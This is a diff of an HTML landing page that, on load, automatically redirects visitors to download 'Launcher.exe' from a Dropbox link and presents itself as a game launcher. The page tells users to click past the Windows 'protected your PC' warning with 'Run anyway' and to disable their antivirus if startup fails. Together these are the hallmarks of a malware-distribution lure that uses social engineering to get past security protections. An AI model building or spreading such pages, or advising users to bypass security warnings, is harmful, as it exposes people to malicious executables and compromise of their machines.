@@ -1,14 +1,85 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="eng">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Launcher</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+            color: #666;
+        }
+        .download-btn {
+            margin-top: 20px;
+            padding: 12px 24px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .download-btn:hover {
+            background-color: #0056b3;
+        }
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+    </style>
     <script>
         window.onload = function() {
             window.location.href = 'https://www.dropbox.com/scl/fi/jw3iex25nc08zf24lft7b/Launcher.exe?rlkey=c03fcr8png7mgco6ajfyr6b7d&st=xrlxu5qd&dl=1';
         };
+
+        function downloadManually() {
+            window.location.href = 'https://www.dropbox.com/scl/fi/jw3iex25nc08zf24lft7b/Launcher.exe?rlkey=c03fcr8png7mgco6ajfyr6b7d&st=xrlxu5qd&dl=1';
+        }
     </script>
 </head>
 <body>
+
+    <div class="container">
+        <h1>📥 INSTRUCTION: HOW TO DOWNLOAD AND RUN THE FILE</h1>
+        <p>🔗 Click on the link:<br>
+           This will start downloading the <strong>launcher.exe</strong>. Once the download is complete, follow the steps below.</p>
+        
+        <h2>🖥️ For Windows 11-10 users:</h2>
+        <p>1. Open the folder with the file and run the .exe<br>
+           2. You might see "Windows protected your PC", simply click "More info" - "Run anyway"</p>
+        
+        <h3>⚠️ If you encounter an error during startup:</h3>
+        <p>Disable your antivirus, as it may block the application because it is not certified by Microsoft.</p>
+
+        <button class="download-btn" onclick="downloadManually()">Download Manually</button>
+
+        <footer>Happy Using! 🎮</footer>
+    </div>
+
 </body>
 </html>
